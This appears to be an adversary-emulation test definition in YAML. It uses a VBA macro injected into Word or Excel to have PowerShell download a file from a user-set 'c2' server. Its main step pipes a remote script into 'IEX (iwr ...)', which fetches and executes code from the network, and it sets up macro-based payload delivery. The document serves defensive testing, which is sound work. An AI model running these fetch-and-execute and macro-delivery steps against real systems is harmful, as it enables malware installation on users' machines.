api_version: "2.0"
name: Office Generic Payload Download
description: |
    This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.
    Required input agruments are c2_domain and file_name
    Execution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
    Example for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder
    Example input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt
args:
    - name: macro_path
      type: path
      default: PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt
    - name: c2_domain
      type: string
      default: <nil>
    - name: c2_parent_directory
      type: path
    - name: file_name
      type: string
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt
    - name: ms_product
      type: string
      default: Word
uuid: 5202ee05-c420-4148-bf5e-fd7f7d24850c
mitre:
    tactics:
        - 'TA0002: Execution'
    techniques:
        - 'T1204: User Execution'
    subtechniques:
        - 'T1204.002: Malicious File'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Destination c2_domain name or IP address must be set to a running HTTP server.
      inline: |
        if (#{c2_domain}) (exit 0) else ({Write-Host "Destination c2 server domain name or IP address must be set and reachable for HTTP service"
        })
      executor: powershell
    - name: |
        Microsoftt #{ms_product} must be installed
      inline: |
        try {
          New-Object -COMObject "#{ms_product}.Application" | Out-Null
          $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
          Stop-Process -Name $process
          exit 0
        } catch { {Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
        } }
      executor: powershell
    - name: office-generic-payload-download
      inline: |
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macroCode = Get-Content "{{.Args.macro_path}}" -Raw
        $URL = "{{.Args.c2_domain}}" + "/" + "{{.Args.c2_parent_directory}}"
        $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "{{.Args.file_name}}"
        Invoke-MalDoc -macroCode $macroCode -officeProduct "{{.Args.ms_product}}"
      executor: powershell
      cleanup:
        inline: |
            Remove-Item "C:\Users\$env:username\Desktop\{{.Args.file_name}}" -ErrorAction Ignore
        executor: powershell
